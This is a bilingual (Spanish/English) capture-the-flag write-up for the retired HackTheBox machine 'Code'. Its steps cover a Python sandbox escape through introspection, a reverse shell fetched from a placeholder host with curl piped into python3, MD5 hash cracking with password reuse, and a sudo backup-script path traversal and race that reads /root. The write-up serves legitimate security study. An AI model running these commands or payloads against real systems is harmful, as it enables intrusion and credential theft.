# Code [Easy]

> **ES:** Máquina Linux fácil: un editor de Python online con lista negra burlable (pyjail) da shell, y un backup con `sudo` permite leer `/root`.
> **EN:** Easy Linux machine: an online Python editor with a bypassable denylist (pyjail) gives shell, and a `sudo` backup tool allows reading `/root`.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Code] |
| **URL** | https://app.hackthebox.com/machines/Code |
| **IP lab** | 10.10.11.62 |
| **Fecha de resolución** | 2025-03-26 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía escape del sandbox Python → hash MD5 crackeado (martin) → abuso de `backy.sh` con `sudo`.
> **EN:** Get `user.txt` and `root.txt` via Python sandbox escape → cracked MD5 hash (martin) → abusing `backy.sh` with `sudo`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] python3 (pyjail escape, reverse shell)
- [ ] sqlite3
- [ ] hash crack (MD5 lookup / john / hashcat)
- [ ] ssh

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Solo SSH y un "Python Code Editor" (Gunicorn) en el puerto 5000.
> **EN:** Only SSH and a "Python Code Editor" (Gunicorn) on port 5000.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.62
```

**Resultado / Result:** 22/tcp OpenSSH 8.2p1, 5000/tcp Gunicorn 20.0.4 "Python Code Editor". Captura del editor en `img/` (ver `img/image_20250323-192340.png`).

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El editor ejecuta código con filtro de palabras (`import`, `system`, `subprocess`, `exec`, `open`, `eval`…). `dir()` muestra un entorno mínimo, típico pyjail.
> **EN:** The editor runs code with a word filter (`import`, `system`, `subprocess`, `exec`, `open`, `eval`…). `dir()` shows a minimal environment, typical pyjail.

```bash
# Probar en el editor web:
# print(dir())
# print("".__class__.__base__.__subclasses__())
```

**Resultado / Result:** El filtro es por subcadena y se evade troceando strings (`"syste"+"m"`). La clase `os._wrap_close` expone `__globals__` con el módulo `os`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Desde `os._wrap_close.__init__.__globals__` se obtiene `os.system` y se descarga/ejecuta una reverse shell como `app-production`.
> **EN:** From `os._wrap_close.__init__.__globals__` we get `os.system` and download/execute a reverse shell as `app-production`.

```bash
# En el editor (idea, fragmentada para evitar el filtro):
# func = "".__class__.__base__.__subclasses__()[132].__init__.__globals__["syste"+"m"]
# print(func("curl <TU-IP>/reverse-shell.py | python3"))
nc -lvnp 9999
python3 -m http.server 80
```

**Resultado / Result:** Reverse shell como `app-production`. `user.txt` de ese usuario legible en su home.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** La app usa `instance/database.db` (SQLite) con hashes MD5; el de `martin` se crackea y reutiliza en SSH.
> **EN:** The app uses `instance/database.db` (SQLite) with MD5 hashes; `martin`'s cracks and is reused over SSH.

```bash
find /home/app-production/app -name "database.db"
sqlite3 database.db ".tables"
sqlite3 database.db "SELECT * FROM user;"
ssh martin@10.10.11.62
```

**Resultado / Result:** Hash MD5 de `martin` crackeado (password reuse) → SSH como `martin` → `user.txt` (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `martin` corre `backy.sh` con `sudo` sin contraseña. El script filtra `../` una sola vez y hay condición de carrera: se archiva `/var/../../../../root/` hacia `/home/martin/Backup`.
> **EN:** `martin` runs `backy.sh` with passwordless `sudo`. The script strips `../` only once and has a race: archive `/var/../../../../root/` into `/home/martin/Backup`.

```bash
sudo -l
cat /usr/bin/backy.sh
# Sesion 1: reescribir 1.json en bucle (task.json con directories_to_archive=["/var/../../../../root/"])
# Sesion 2:
mkdir -p /home/martin/Backup
sudo /usr/bin/backy.sh 1.json
ls /home/martin/Backup/
```

**Resultado / Result:** Backup de `/root` (incluido `root.txt` y claves SSH) copiado a directorio propio. Técnica: path traversal + TOCTOU/race contra `backy` (vdbsh/backy).

---

## 🧠 Lo aprendido / Learned

> **ES:** Las denylist en pyjails se evaden con introspección (`__class__`, `__globals__`); los hashes débiles (MD5) + reutilización dan salto lateral; validar paths con un solo `gsub` y reescribir el JSON antes de usarlo abre carreras.
> **EN:** Pyjail denylists fall to introspection (`__class__`, `__globals__`); weak hashes (MD5) + reuse give lateral move; single-pass path sanitization with rewrite-before-use opens races.

- [ ] Escape de pyjail vía `object.__subclasses__()` y `__globals__`
- [ ] SQLite + MD5 crack + password reuse
- [ ] Abuso de `sudo` script con traversal y condición de carrera

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Code/index.md` (notas CN/EN sin normalizar, con capturas en `img/`) — autor original de la nota local
- **Walkthrough de referencia:** Máquina Code en HackTheBox — https://app.hackthebox.com/machines/Code
- **Referencia técnica:** Proyecto backy usado por el binario — https://github.com/vdbsh/backy
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y normalizado desde `index.md` al molde `_PLANIFICACION/PLANTILLA_MACHINE.md`; paráfrasis propia, sin flags completas.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
